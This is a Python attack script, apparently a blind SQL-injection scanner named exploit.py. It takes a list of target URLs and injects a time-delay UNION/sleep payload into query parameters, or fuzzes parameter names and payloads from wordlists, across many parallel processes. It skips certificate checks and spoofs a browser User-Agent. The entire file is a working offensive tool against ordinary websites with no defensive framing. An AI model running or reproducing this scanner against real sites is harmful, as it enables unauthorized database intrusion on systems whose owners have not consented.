from colorama.ansi import Style
import requests, optparse, sys, multiprocessing
from math import fsum
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import colorama
from colorama import Fore

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def menu():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest="url", help='Base target uri (ex. http://target-uri/)')
    parser.add_option('-f', '--file', dest="file", help='example.txt')
    parser.add_option('-t', '--time', dest="time_to_sleep", type=int)
    parser.add_option('-c', '--concurrents', dest="threads", type=int,default=100)
    parser.add_option('-m', '--maxtimeout', dest="timeout", type=int,default=8)
    parser.add_option('-o', '--output', dest="output", type=str,default='resultsBlind.txt')
    parser.add_option('-k', '--keys', dest="file_to_fuzz_keys", type=str)
    parser.add_option('-p', '--payloads', dest="payloads_to_fuzz_values", type=str)
    parser.add_option('-d', '--discover', action="store_true", dest="fuzz_keys_and_payloads")

    options, args = parser.parse_args()

    if not options.url and not options.file:
        print('[+] Specify an url')
        print('[+] Example usage: exploit.py -u http://target-uri/ -t 10')
        exit()
    if not options.time_to_sleep:
        print('[+] Specify a blind time based payload')
        print('[+] Example usage: exploit.py -u http://target-uri/ -t 10')
        exit()
    if not options.file:
        print('[+] Specify a file')
        print('[+] Example usage: exploit.py -f urls -u http://target-uri/ -t 10')
        exit()
    globals().update(locals())

def mesure_time_loading(url,url_replaced=False):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
    if url_replaced is not False:
        url=url_replaced
    try:
        r = requests.get(url,headers=headers,allow_redirects=False, verify=False,timeout=20)
    except requests.exceptions.ConnectionError:
        exit()
    return round(r.elapsed.total_seconds(),2)

def test_time_based_sql_blind(url):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
    try:
        r = requests.get(url,headers=headers,allow_redirects=False, verify=False,timeout=20)
    except requests.exceptions.ConnectionError:
        exit()
    return round(r.elapsed.total_seconds(),2)

def check_sqli_time_based(url,url_replaced=False):
    first_elapsed_time = mesure_time_loading(url)
    blind_elapsed_time = mesure_time_loading(url,url_replaced)
    second_elapsed_time = mesure_time_loading(url)
    average_common_elapsed_time = round((sum([first_elapsed_time+second_elapsed_time])/2),2)
    rules_to_confirme_blind_sqli = average_common_elapsed_time < blind_elapsed_time and blind_elapsed_time > options.time_to_sleep

    if url_replaced:
        url=url_replaced # just to log the sqli url
    if rules_to_confirme_blind_sqli:
        print('{}[Blind Confirmed]{} {} / [Reqs] Average:{} Blinded:{}'.format(Fore.RED,Fore.RESET,url,average_common_elapsed_time,blind_elapsed_time))
    else:
        print('{}[There isnt blind SQLI]{}{}'.format(Fore.BLACK,Fore.LIGHTBLACK_EX,url,Style.RESET_ALL))

def url_mutation_querie_fuzz(url):
    if not url.startswith('http'):
        url='http://'+url
    if "?" in url:
        query_strings = url.split('?')[1].split('&')
        for keypair in query_strings:
            key, value = keypair.split('=')
            if options.file_to_fuzz_keys and options.payloads_to_fuzz_values:
                brute_url_mutation_querie_fuzz(url,key,value)
            else:
                url_replaced = url.replace(key+'='+value,key+"="+'1%27%20union%20select%201,2,sleep(5)--+')
                check_sqli_time_based(url,url_replaced)
    else:
        if options.file_to_fuzz_keys and options.payloads_to_fuzz_values:
            brute_url_mutation_querie_fuzz(url,key,value)
        else:
            print('[Warn] URL without queryString. You need to brute force it by using payload flag')

def brute_url_mutation_querie_fuzz(url,key,value):
    if key and value:
        values_words = open(options.payloads_to_fuzz_values).readlines()
        for value_word in values_words:
            url_replaced = url.replace(key+"="+value,key+"="+value_word).replace('\n','')
            check_sqli_time_based(url,url_replaced)

    if options.fuzz_keys_and_payloads:
        keys_words = open(options.file_to_fuzz_keys).readlines()
        values_words = open(options.payloads_to_fuzz_values).readlines()
        for key_word in keys_words:
            for value_word in values_words:
                url_replaced = url.replace(url,url+'&'+key_word+"="+value_word).replace('\n','')
                check_sqli_time_based(url,url_replaced)

def main():
    menu()
    if not sys.stdin.isatty():
        urls = sys.stdin.read()
    else:
        f = open(options.file)
        urls = map(str.strip, f.readlines())
    fire = multiprocessing.Pool(options.threads)
    try:
        fire.map(url_mutation_querie_fuzz, urls)
        fire.close()
        fire.join()
    except UnboundLocalError:
        pass
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()
